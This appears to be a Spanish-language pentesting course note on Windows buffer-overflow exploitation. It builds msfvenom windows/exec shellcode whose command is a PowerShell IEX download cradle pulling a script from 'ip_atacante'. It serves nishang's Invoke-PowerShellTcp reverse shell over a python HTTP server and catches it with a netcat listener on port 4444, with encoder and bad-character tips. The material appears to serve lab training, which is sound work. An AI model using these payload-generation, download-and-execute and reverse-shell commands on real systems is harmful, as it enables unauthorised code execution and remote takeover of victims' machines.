- Tags : #buffer_overflow 

Además de los payloads que se han utilizado en las clases anteriores, también es posible utilizar payloads como “**windows/exec**” para cargar directamente el comando que se desea ejecutar en la variable **CMD** del payload. Esto permite crear un nuevo shellcode que, una vez interpretado, ejecutará directamente la instrucción deseada.

El payload “**windows/exec**” es un payload de Metasploit que permite ejecutar un comando arbitrario en la máquina objetivo. Este payload requiere que se especifique el comando a ejecutar a través de la variable CMD en el payload. Al generar el shellcode con msfvenom, se puede utilizar el parámetro “-p windows/exec CMD=\<comando\>” para especificar el comando que se desea ejecutar.



Una vez generado el shellcode con el comando deseado, se puede utilizar la técnica de buffer overflow para sobrescribir el registro EIP y hacer que el flujo del programa entre en el shellcode. Al interpretar el shellcode, se ejecutará directamente el comando especificado en la variable CMD.

Comando para ejecutar un comando especifico
```bash
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://ip_atacante/PS.ps1')" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread

```


**Recurso**: [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

De aqui utilizaremos [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 "Invoke-PowerShellTcp.ps1")
Lo renombramoa a PS.ps1

![](../../../attachments/Pasted%20image%2020260224230727.png)

Nos montamos un servidor tcp con python para servir el PS.ps1 y en otra consola nos ponemos a la
escucha por el puerto especificado.
```bash
python3 -m http.server 80


nc -nlvp 4444
```

Agregamos el nuevo shellcode generado al script de python y ejecutamos el script 

![](../../../attachments/Pasted%20image%2020260224231206.png)


![](../../../attachments/Pasted%20image%2020260224231449.png)

*NOTA : cuando tenemos varios badchars puede que el shikata_ga_nai no pueda generar uno correcto en estos casos pues simplemente lo quitamos y dejamos a msfvenon que se encargue de elegir uno correcto*

```bash 
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://ip_atacante/PS.ps1')" --platform windows -a x86 -f c -b '\x00\x0a\x0d' EXITFUNC=thread
```